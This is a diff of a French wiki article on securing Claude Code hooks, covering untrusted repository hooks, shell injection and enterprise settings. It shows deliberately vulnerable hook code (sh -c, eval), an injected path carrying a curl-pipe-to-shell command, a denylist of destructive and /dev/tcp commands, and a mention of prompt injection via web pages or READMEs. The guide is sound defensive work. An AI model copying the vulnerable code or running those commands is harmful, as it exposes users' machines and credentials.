@@ -1,106 +1,154 @@
 ---
-title: "Sécurité : éviter le RCE dans les hooks"
-description: "Les hooks Claude Code exécutent du shell sur votre machine. Voici comment éviter les injections de commandes et écrire des hooks défensifs."
-updatedAt: "2026-05-19"
-readingMinutes: 6
+title: "Sécurité des hooks : éviter l'exécution de code arbitraire"
+description: "Les deux vraies portes d'entrée (dépôts piégés et injection de commandes dans vos scripts), la confiance d'espace de travail, les réglages d'entreprise et les règles d'écriture d'un hook sûr."
+updatedAt: "2026-10-03"
+readingMinutes: 8
 ---
 
-Un hook Claude Code, c'est du code shell exécuté par le harnais avec vos droits utilisateur. Concrètement : un `PreToolUse` mal écrit qui interpole un champ JSON contrôlé par le modèle dans une commande bash, c'est une porte ouverte à l'exécution de code arbitraire (RCE) sur votre poste. Le modèle peut être manipulé via une page web, un fichier README, ou même un commit malicieux. Cet article passe en revue les patterns dangereux et les bonnes pratiques.
+Un hook `command` est du shell exécuté avec vos droits utilisateur, sans bac à sable : il peut lire, modifier ou supprimer tout ce que votre compte peut toucher. Le risque d'exécution de code arbitraire (RCE) vient de deux directions : des hooks que vous n'avez pas écrits (dépôt cloné, plugin), et des hooks que vous avez écrits mais qui exécutent par erreur des données contrôlées par le modèle.
 
-## Comprendre la surface d'attaque
+## Porte d'entrée 1 : les hooks d'un dépôt que vous n'avez pas écrit
 
-Chaque hook reçoit, sur `stdin`, un objet JSON contenant le contexte de l'événement : nom de l'outil, arguments, chemin du projet, etc. Le danger arrive quand on extrait un champ via `jq -r` puis qu'on le passe directement à une commande shell sans validation.
+Un dépôt peut contenir un `.claude/settings.json` avec des hooks. Ouvrir Claude Code dedans peut donc lancer ses scripts. Claude Code applique une règle de **confiance d'espace de travail** :
 
-Exemple typique de hook vulnérable :
+- **Session interactive** : aucun hook de settings ne tourne (pas même ceux de votre `~/.claude/settings.json`) tant que vous n'avez pas accepté la boîte de dialogue de confiance pour ce dossier.
+- **Mode `-p` ou SDK** : la boîte de dialogue n'existe pas et le dossier est considéré comme de confiance. **Les hooks versionnés dans le dépôt s'exécutent.**
+
+Avant de scripter `claude -p` sur un dépôt externe (CI sur des pull requests de contributeurs, audit d'un projet tiers) :
+
+1. Lisez `.claude/settings.json`, `.claude/settings.local.json` et les skills ou agents du dossier `.claude/`.
+2. Ou démarrez avec `--bare`.
+3. Ou coupez les hooks pour l'exécution : `claude -p --settings '{"disableAllHooks": true}' "..."`.
+
+Les hooks déclarés dans le frontmatter d'une skill de projet suivent la même règle que ceux des settings. Ceux d'un sous-agent de projet sont plus stricts : ils ne tournent qu'après acceptation explicite de la confiance, même en `-p`. Les plugins apportent aussi leurs hooks (`hooks/hooks.json`) : n'installez que des plugins dont vous avez lu le code ou dont vous faites confiance à l'auteur.
+
+## Porte d'entrée 2 : l'injection de commandes dans vos scripts
+
+Le JSON reçu sur stdin contient des valeurs que le modèle a choisies : la commande `Bash`, le chemin du fichier, le contenu écrit, le prompt. Or le modèle peut être manipulé par une page web, un README ou un commentaire de code (injection de prompt). Toute valeur de `tool_input` doit être traitée comme une donnée hostile.
+
+Le danger n'est pas de stocker une valeur dans une variable : `CMD=$(jq -r ...)` puis `echo "$CMD"` n'exécute rien. Le danger, c'est de **réinterpréter** la valeur comme du code :
+
+```bash
+#!/bin/bash
+# VULNÉRABLE : ne pas copier
+FILE=$(jq -r '.tool_input.file_path')
+sh -c "npx prettier --write $FILE"          # la valeur est réinterprétée par un shell
+eval "echo Fichier modifié : $FILE"         # idem
+osascript -e "display notification \"$FILE\""   # injection AppleScript
+```
+
+Un chemin comme `/tmp/a.ts; curl https://exemple.invalid/x | sh` exécute la seconde commande. La version sûre passe la valeur comme **argument**, entre guillemets, sans shell intermédiaire :
+
+```bash
+#!/bin/bash
+FILE=$(jq -r '.tool_input.file_path // empty')
+[ -z "$FILE" ] && exit 0
+npx --no-install prettier --write -- "$FILE"
+```
+
+Le `--` empêche aussi l'injection d'options (un fichier nommé `--config=...`).
+
+### Les règles d'écriture
+
+| À faire | À éviter |
+|---|---|
+| `"$VAR"` toujours entre guillemets | `$VAR` nu (découpage et globbing) |
+| Passer les valeurs en arguments, avec `--` | `sh -c "... $VAR"`, `bash -c`, `eval`, `source` |
+| Construire du JSON avec `jq -n --arg` | Concaténer du JSON à la main |
+| `printf '%s' "$VAR" \| grep -q` | `echo $VAR` (options, séquences d'échappement) |
+| Passer le texte à `osascript` via `on run argv` | Interpoler dans une chaîne AppleScript |
+| Comparer des chaînes (`case`, `[[ == ]]`) | Exécuter la valeur pour « tester » |
+
+### Préférer la forme exec
+
+Un hook `command` sans `args` passe sa chaîne à `sh -c` (forme shell). Avec `args`, Claude Code lance l'exécutable directement, sans shell : pas d'expansion, pas de pipes, chaque élément est un argument littéral.
+
+```json
+{
+  "type": "command",
+  "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/guard.sh",
+  "args": []
+}
+```
+
+C'est la forme recommandée dès que la commande référence `${CLAUDE_PROJECT_DIR}` ou `${CLAUDE_PLUGIN_ROOT}`. En forme shell, entourez ces chemins de guillemets doubles. Les options de plugin `${user_config.*}` ne sont plus substituées en forme shell : utilisez la forme exec ou la variable `$CLAUDE_PLUGIN_OPTION_<CLÉ>`.
+
+## Un hook n'est pas un pare-feu
+
+Trois limites à connaître avant de confier une politique de sécurité à un hook :
+
+- **`exit 1` ne bloque pas.** Seul `exit 2` (ou un JSON `deny`) bloque. Un script qui plante, introuvable ou non exécutable, laisse passer l'action : surveillez la mention `hook error` au premier lancement.
+- **Un timeout ne bloque pas.** Un hook `PreToolUse` annulé au bout de son `timeout` laisse l'appel suivre le flux normal.
+- **Le filtre `if` est « best effort ».** Si Claude Code ne sait pas analyser une commande Bash, il lance le hook quand même, mais une regex reste contournable (`/bin/rm`, variables, encodage).
+
+Pour un interdit absolu, utilisez les **règles de permission** (`permissions.deny`) et le **sandbox**. Le hook vient en complément : il donne un message clair à Claude et journalise. Bonne nouvelle, un `permissionDecision: "deny"` en `PreToolUse` reste respecté même en mode `bypassPermissions`. Attention en revanche : un [mod](/wiki/plugins/mods) qui gère `tool.check` peut approuver un appel bloqué par votre hook, sauf si ce hook vient des settings gérés.
+
+## Exemple : garde-fou sur les fichiers sensibles
+
+```bash
+#!/bin/bash
+# .claude/hooks/protect-files.sh
+FILE=$(jq -r '.tool_input.file_path // empty')
+FILE="${FILE//\\//}"   # normaliser les chemins Windows
+
+case "$FILE" in
+  */.env|*/.env.*|*/.ssh/*|*/.aws/*|*/.git/*|*/id_rsa*)
+    echo "Écriture refusée : $FILE est un fichier sensible protégé par le projet." >&2
+    exit 2
+    ;;
+esac
+exit 0
+```
 
 ```json
 {
   "hooks": {
     "PreToolUse": [
       {
-        "matcher": "Bash",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "CMD=$(jq -r '.tool_input.command'); echo \"Exécution: $CMD\" >> /tmp/log"
-          }
-        ]
+        "matcher": "Edit|Write",
+        "hooks": [{ "type": "command", "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/protect-files.sh", "args": [] }]
       }
     ]
   }
 }
 ```
 
-Si le modèle propose une commande contenant des backticks ou `$(...)`, le `echo` va l'évaluer. Catastrophe.
+Doublez-le d'une règle `"deny": ["Edit(**/.env*)", "Read(**/.env*)"]` dans les permissions : la règle bloque aussi les lectures via `@`, que le hook ne voit pas.
 
-## Patterns sûrs : quoting et JSON pur
+## Secrets et environnement
 
-La règle d'or : **ne jamais interpoler du contenu non fiable dans une commande shell**. Travaillez avec `jq` jusqu'au bout, ou utilisez un script dédié qui lit le JSON via `stdin`.
+- Un hook hérite de l'environnement de `claude`, secrets compris. Claude Code retire seulement les variables d'export `OTEL_*`, et davantage si `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1`.
+- Ne mettez jamais de token dans un `settings.json` versionné. Pour un hook `http`, utilisez `headers` avec `allowedEnvVars` : seules les variables listées sont interpolées.
+- Les hooks `prompt` et `agent` envoient le JSON de l'événement à un modèle : évitez-les sur des événements qui transportent des données sensibles.
 
-```json
-{
-  "hooks": {
-    "PreToolUse": [
-      {
-        "matcher": "Bash",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "jq -r '.tool_input.command' | /usr/local/bin/audit-bash.sh"
-          }
-        ]
-      }
-    ]
-  }
-}
-```
+## Contrôles côté entreprise
 
-Et dans `audit-bash.sh`, on lit `stdin` proprement, on stocke dans une variable, et on n'évalue jamais :
+Dans les settings gérés, un administrateur peut :
 
-```bash
-#!/usr/bin/env bash
-set -euo pipefail
-CMD="$(cat)"
-# Comparaison de chaînes, pas d'exécution
-case "$CMD" in
-  *"rm -rf /"*|*"curl "*"| sh"*|*":(){:|:&};:"*)
-    echo "Commande bloquée par politique locale" >&2
-    exit 2
-    ;;
-esac
-```
+- `allowManagedHooksOnly` : seuls les hooks gérés (et ceux des plugins imposés) tournent ; hooks utilisateur, projet, local et plugins ordinaires sont bloqués ;
+- `allowedHttpHookUrls` : liste blanche des URL des hooks `http` ;
+- `httpHookAllowedEnvVars` : variables autorisées dans les en-têtes HTTP ;
+- `disableAllHooks` au niveau géré : seul moyen de couper aussi les hooks gérés.
 
-## Construire une denylist (et pas une allowlist naïve)
+Un `disableAllHooks` posé par un utilisateur ne désactive jamais les hooks gérés.
 
-Une denylist arrête les attaques connues sans gêner l'usage quotidien. Quelques patterns à inclure : `rm -rf` sur des chemins absolus, `chmod 777`, `curl ... | sh`, `wget ... | bash`, écritures dans `~/.ssh`, `~/.aws/credentials`, `/etc/`. Et des bloqueurs comme `eval`, `source` sur des fichiers tmp, ou des redirections sortantes vers `/dev/tcp`.
+## Checklist avant d'activer un hook
 
-```bash
-#!/usr/bin/env bash
-INPUT="$(cat)"
-TOOL="$(echo "$INPUT" | jq -r '.tool_name')"
-PATH_ARG="$(echo "$INPUT" | jq -r '.tool_input.file_path // empty')"
+1. Lire chaque ligne, surtout s'il vient d'Internet ou d'un plugin.
+2. Le tester avec un JSON factice contenant des guillemets, des espaces et `;` dans les champs.
+3. Vérifier qu'il échoue en `exit 0` (laisser passer) ou en `exit 2` (bloquer) selon votre intention, jamais en `exit 1` par accident.
+4. Protéger les scripts en écriture (`chmod 755`, propriétaire vous) : un hook modifiable par un autre processus est une porte dérobée.
+5. Journaliser ce qui est bloqué pour repérer les tentatives.
 
-case "$PATH_ARG" in
-  *"/.ssh/"*|*"/.aws/"*|*"/.env"|*"/.env."*)
-    echo "Écriture interdite dans un fichier sensible: $PATH_ARG" >&2
-    exit 2
-    ;;
-esac
-```
+## Articles liés
 
-Un `exit 2` depuis un `PreToolUse` bloque l'appel d'outil et retourne le message au modèle, qui peut ajuster sa stratégie.
+- [PreToolUse et PostToolUse](/wiki/hooks/pre-post-tool-use)
+- [Hooks et environnement d'exécution](/wiki/hooks/environnement)
+- [Les modes de permission](/wiki/cli/permissions-modes)
+- [Threat modeling pour agents autonomes](/wiki/enterprise/threat-modeling-agents)
+- [Prompt injection](/wiki/workflows/prompt-injection)
 
-## Principe de moindre privilège
+## Sources
 
-Vos hooks tournent avec votre UID. Si vous travaillez sur du code non audité (PR externes, dépendances fraîches), faites tourner Claude Code dans un conteneur ou une VM. Désactivez les hooks qui touchent au réseau (`curl`, `git push`) en environnement à risque. Et surtout : **ne committez jamais de secrets dans `settings.json`** — préférez des variables d'environnement lues au runtime.
-
-## Auditer ce qui s'exécute
-
-Loggez chaque appel de hook dans un fichier JSONL local, avec timestamp et payload complet. En cas d'incident, vous saurez ce qui a été tenté. Pensez aussi à `chmod 700` sur vos scripts de hook pour éviter qu'un autre processus ne les modifie.
-
-## Pour aller plus loin
-
-- Tester chaque nouveau hook dans un dossier jetable avant de l'activer globalement.
-- Lire les changelogs de Claude Code : la doc précise quels champs JSON sont garantis et lesquels peuvent être manipulés.
-- Croiser avec `git diff` les modifications apportées par les hooks pour repérer une exfiltration silencieuse.
-- Garder une commande de panique : `claude --no-hooks` ou supprimer `settings.json` si quelque chose tourne mal.
+- [Hooks reference : Security considerations, Exec form and shell form](https://code.claude.com/docs/en/hooks)
+- [Automate actions with hooks : Hooks and permission modes](https://code.claude.com/docs/en/hooks-guide)
